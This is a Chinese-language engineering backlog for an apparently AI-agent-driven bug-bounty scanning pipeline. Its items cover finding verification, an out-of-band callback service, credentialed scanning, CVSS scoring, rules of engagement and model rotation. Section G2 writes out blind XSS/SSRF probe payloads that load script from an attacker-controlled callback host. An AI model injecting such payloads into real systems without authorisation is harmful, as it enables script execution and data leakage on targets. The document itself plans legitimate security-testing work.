# SRC 就绪迭代 backlog（用户指令 2026-08-29，全部要求根除/补齐）

## G1 推测性 finding 根除（最高优先）
- validator.js: xss/ssrf/ssti 类 finding 的 verified 必须 = 响应体含 payload 原样反射（断言不中即 quarantine）
- 反向审计：runs/evidence 里历史全部 finding 逐条复查"surface/可能/疑似"类措辞 → 补断言重放，不过即隔离
- eval_profile FP 判定同步收紧；SKILL.md 铁律增"攻击面≠漏洞"
- 回归：tests 增 spec-finding 负例（含 testaspnet find-xss-newsad-001 真实案例）

## G2 OAST 带外回调（dnslog 外带式，用户确认方向）
- 自建回调服务 scripts/gateway/oast.mjs：随机子域 DNS/HTTP 回调捕获（127.0.0.1 绑定 + bore 隧道出网，复用既有 bore）
- briefs 注入 per-engagement 回调 URL；worker 对 blind xss/ssrf 用 `<script src=//cb-<eng>.host>` / http://cb-<eng>.host/probe
- graphd Signal_ 增 oast_hit 字段；watchdog 轮询回调日志 → 命中即回填 verified 证据

## G3 凭据化扫描（用户手动提供账密）
- profiles 增 "auth": {"login_url","user","pass_field","cred_env":"SRC_CREDS_<NAME>"}——凭据只走 env/密钥服务，不入库
- discovery/deep brief 注入登录指引；adapter-dsh spawnWorker 传递 SRC_CREDS_* env
- 会话保持：登录后 cookie 存 runs/<eng>/session.json，worker 复用

## G4 CVSS + 程序 ROE
- scripts/eval/cvss.py：CVSS v3.1 向量计算（FIRST 口径），report.mjs 接入产出评分
- profiles 增 "roe": {"allowed_classes":[], "forbidden":[], "rate_pps":N, "note_url":..}；checkBash/graphd 门消费 forbidden

## G5 已知/重复过滤
- finding 指纹 = (host, path, param, category, payload-hash)；新增 scripts/eval/dedup_known.py
- 已提交库 evidence/src-submitted.json 累积；提交前比对，命中即标记 wont_resubmit

## G6 模型轮换（dsh settings.yaml 驱动）
- ~/.dsh/settings.yaml providers 已含 minimax-cn(M2.7/M2.7-highspeed/M3) + opencode-go(mimo-v2.5)
- 新增 model-rotation 列表（用户可编辑）：["minimax-cn/MiniMax-M3","minimax-cn/MiniMax-M2.7","minimax-cn/MiniMax-M2.7-highspeed","opencode-go/mimo-v2.5"]
- scripts/ops/model-rotate.sh：worker exit=1 连续 N 次或配额错误特征 → 切下一模型改写 agent-default-model + 记录
- 模型能力档案（多模态/视觉/上下文）记录在 profiles 侧表 scripts/ops/models.json：{id, vision:bool, ctx:int, notes}——视觉模型才可分析截图类证据

## 执行顺序
G1(先做，阻塞双 PASS) → G6(保连续性) → G3 → G2 → G4 → G5 → 全队列重打( fleet.sh + watchdog 滚动) → ITERATION 对比报告
